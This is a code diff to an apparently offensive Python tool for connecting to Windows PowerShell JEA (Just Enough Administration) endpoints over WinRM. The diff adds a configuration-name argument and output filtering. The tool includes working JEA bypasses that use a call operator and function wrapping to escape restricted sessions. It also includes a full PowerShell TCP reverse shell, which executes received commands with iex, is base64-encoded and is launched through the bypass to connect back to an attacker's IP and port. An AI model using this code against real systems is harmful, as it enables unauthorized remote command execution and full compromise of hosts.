@@ -13,6 +13,8 @@ import re
 import base64
 from pypsrp.powershell import PowerShell, RunspacePool
 from pypsrp.wsman import WSMan
+from pypsrp.messages import ErrorRecordMessage
+from pypsrp.complex_objects import GenericComplexObject
 from .__init__ import __version__
 
 LOGGING_LEVELS = {
@@ -81,8 +83,9 @@ JEA Shell Commands:
 @click.argument('username')
 @click.argument('password')
 @click.argument('target')
+@click.argument('configuration_name')
 @click.option('--raw', '-r', is_flag=True, help="Pass commands through raw pipe (via add_script). Useful for executing non-cmdlet commands. Default is FALSE.")
-def connect(username, password, target, raw):
+def connect(username, password, target, configuration_name, raw):
     """
     Connect to JEA target.
     
@@ -95,12 +98,11 @@ def connect(username, password, target, raw):
         rev_shell [ip] [port]   JEA bypass: Attempts to run a PowerShell reverse shell using call operator
     """
     commands = ["help", "call", "function", "info", "rev_shell"]
-
     wsman = WSMan(target, username=username,
               password=password, ssl=False,
               auth="negotiate",cert_validation=False)
     print("[+] Testing connection...")
-    test_output = run_command(wsman, "Get-Command", raw)
+    test_output = run_command(wsman, configuration_name, "Get-Command", raw)
     if (test_output):
         print("[+] Connection succeeded. Available commands:")
         for result in test_output:
@@ -110,41 +112,90 @@ def connect(username, password, target, raw):
 
     while True:
         command = input(f"[{target}]: PS> ")
-        root_command = command.split()[0]
-        if root_command in commands:
-            match root_command:
-                case "help":
-                    print(help_text)
-                case "info":
-                    info(wsman, raw)
-                case "call":
-                    try:
-                        new = " ".join(command.split()[1:])
-                        for result in call_bypass(wsman, new, raw):
-                            print(result)
-                    except:
-                        print("Something went wrong. Did you provide an argument to the call command?")
-                case "function":
-                    try:
-                        new = " ".join(command.split()[1])
-                        for result in function_bypass(wsman, new, raw):
-                            print(result)
-                    except:
-                        print("Something went wrong. Did you provide an argument to the call command?")
-                case "rev_shell":
-                    try:
-                        ip = command.split()[1]
-                        port = command.split()[2]
-                        reverse_shell(wsman, ip, port)
-                    except:
-                        print("Something went wrong. Did you pass an IP and port to connect back to?")
-                case _:
-                    print("JEA shell command not found!")
-        else:
-            result = run_command(wsman, command, raw)
-            for output in result:
-                print(output)
-
+        splitted_command = command.split()
+        if len(splitted_command) > 0:
+            root_command = splitted_command[0]
+            if root_command in commands:
+                match root_command:
+                    case "help":
+                        print(help_text)
+                    case "info":
+                        info(wsman, configuration_name, raw)
+                    case "call":
+                        try:
+                            new = " ".join(command.split()[1:])
+                            for result in call_bypass(wsman, configuration_name, new, raw):
+                                print(result)
+                        except:
+                            print("Something went wrong. Did you provide an argument to the call command?")
+                    case "function":
+                        try:
+                            new = " ".join(command.split()[1])
+                            for result in function_bypass(wsman, configuration_name, new, raw):
+                                print(result)
+                        except:
+                            print("Something went wrong. Did you provide an argument to the call command?")
+                    case "rev_shell":
+                        try:
+                            ip = command.split()[1]
+                            port = command.split()[2]
+                            reverse_shell(wsman, configuration_name, ip, port)
+                        except:
+                            print("Something went wrong. Did you pass an IP and port to connect back to?")
+                    case _:
+                        print("JEA shell command not found!")
+            else:
+                result = run_command(wsman, configuration_name, command, raw)
+                if type(result) == ErrorRecordMessage:
+                    print(result)
+                else:
+                    bad_keys = [
+                        "Author",
+                        "SessionType",
+                        "SchemaVersion",
+                        "GUID",
+                        "ResourceUri",
+                        "Capability",
+                        "AutoRestart",
+                        "ExactMatch",
+                        "RunAsVirtualAccount",
+                        "SDKVersion",
+                        "Uri",
+                        "MaxConcurrentCommandsPerShell",
+                        "IdleTimeoutms",
+                        "ParentResourceUri",
+                        "OutputBufferingMode",
+                        "Architecture",
+                        "UseSharedProcess",
+                        "MaxProcessesPerShell",
+                        "Filename",
+                        "MaxShellsPerUser",
+                        "ConfigFilePath",
+                        "MaxShells",
+                        "SupportsOptions",
+                        "lang",
+                        "MaxIdleTimeoutms",
+                        "xmlns",
+                        "Enabled",
+                        "ProcessIdleTimeoutSec",
+                        "MaxConcurrentUsers",
+                        "MaxMemoryPerShellMB",
+                        "ModulesToImport",
+                        "XmlRenderingType"
+                    ]
+                    for output in result:
+                        if isinstance(output, GenericComplexObject):
+                            obj_lines = output.property_sets
+                            for key, value in output.adapted_properties.items():
+                                if not key in bad_keys:
+                                    obj_lines.append(u"%s: %s" % (key, value))
+                            for key, value in output.extended_properties.items():
+                                if not key in bad_keys:
+                                    obj_lines.append(u"%s: %s" % (key, value))
+                            output_msg = u"\n".join(obj_lines) + "\n"
+                            print(output_msg)
+                        else:
+                            print(output)
 
 @cli.command()
 def version():
@@ -155,9 +206,10 @@ def version():
 @click.argument('username')
 @click.argument('password')
 @click.argument('target')
+@click.argument('configuration_name')
 @click.option('--command', '-c', required=True, help="Command to run on the taget")
 @click.option('--raw', '-r', is_flag=True, help="Pass commands through raw pipe (via add_script). Useful for executing non-cmdlet commands. Default is FALSE.")
-def run(username, password, target, command, raw):
+def run(username, password, target, command, configuration_name, raw):
     """
     Run a single command on the JEA target.    
     """
@@ -165,7 +217,7 @@ def run(username, password, target, command, raw):
     wsman = WSMan(target, username=username,
               password=password, ssl=False,
               auth="negotiate",cert_validation=False)
-    result = run_command(wsman, command, raw)
+    result = run_command(wsman, configuration_name, command, raw)
     for output in result:
         print(output)
 
@@ -175,7 +227,8 @@ def run(username, password, target, command, raw):
 @click.argument('target')
 @click.argument('lhost')
 @click.argument('lport')
-def shell(username, password, target, lhost, lport):
+@click.argument('configuration_name')
+def shell(username, password, target, lhost, lport, configuration_name):
     """
     Attempts to run a reverse shell on the target using a call operator bypass.    
     """
@@ -183,12 +236,12 @@ def shell(username, password, target, lhost, lport):
     wsman = WSMan(target, username=username,
               password=password, ssl=False,
               auth="negotiate",cert_validation=False)
-    reverse_shell(wsman, lhost, lport)
+    reverse_shell(wsman, configuration_name, lhost, lport)
 
 
-def run_command(wsman, command, raw):
+def run_command(wsman, configuration_name, command, raw):
     commands = re.findall(r'(?:[^\s"]|"(?:\\.|[^"])*")+', command)
-    with RunspacePool(wsman) as pool:
+    with RunspacePool(wsman, configuration_name=configuration_name) as pool:
         ps = PowerShell(pool)
         if raw:
             ps.add_script(command)
@@ -217,25 +270,27 @@ def run_command(wsman, command, raw):
             else: 
                 ps.add_cmdlet(command) 
         ps.invoke()
+        if ps.had_errors:
+            return ps.streams.error[0]
         return ps.output
 
-def call_bypass(wsman, command, raw):
-    result = run_command(wsman, "&{ " + command + " }", raw)
+def call_bypass(wsman, configuration_name, command, raw):
+    result = run_command(wsman, configuration_name, "&{ " + command + " }", raw)
     return result
 
-def function_bypass(wsman, command, raw):
-    result = run_command(wsman, "function gl {" + command + "}; gl", raw)
+def function_bypass(wsman, configuration_name, command, raw):
+    result = run_command(wsman, configuration_name, "function gl {" + command + "}; gl", raw)
     return result
 
-def info(wsman, raw):
-    result = run_command(wsman, 'Get-Command', raw)
+def info(wsman, configuration_name, raw):
+    result = run_command(wsman, configuration_name, 'Get-Command', raw)
     for output in result:
         print(f"Name: {output.adapted_properties.get('Name')}")
         print(f"Type: {output.adapted_properties.get('CommandType')}")
         print("==========================")
         print(output.adapted_properties.get('ScriptBlock'))
         
-def reverse_shell(wsman, ip, port):
+def reverse_shell(wsman, configuration_name, ip, port):
     shell = """
 $client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
         """
@@ -245,5 +300,5 @@ $client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $clie
     payload = f"powershell -e {b64.decode()}"
     print("Running reverse shell payload using call bypass, check your listener:")
     print(payload)
-    call_bypass(wsman, payload, True)
+    call_bypass(wsman, configuration_name, payload, True)
 
